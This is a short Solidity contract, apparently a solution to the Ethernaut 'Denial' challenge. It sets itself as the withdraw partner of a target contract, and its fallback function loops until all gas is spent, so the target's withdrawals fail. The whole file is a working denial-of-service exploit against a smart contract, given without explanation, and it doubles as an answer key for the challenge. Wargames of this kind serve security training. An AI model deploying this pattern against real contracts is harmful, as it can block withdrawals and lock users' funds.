// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IDenial {
    function setWithdrawPartner (address _partner) external;
}

contract Solution {
    fallback() external payable {
        while (gasleft() > 0){
        }
    }

    function deny(address _deny) public {
        IDenial(_deny).setWithdrawPartner(address(this));
    }
}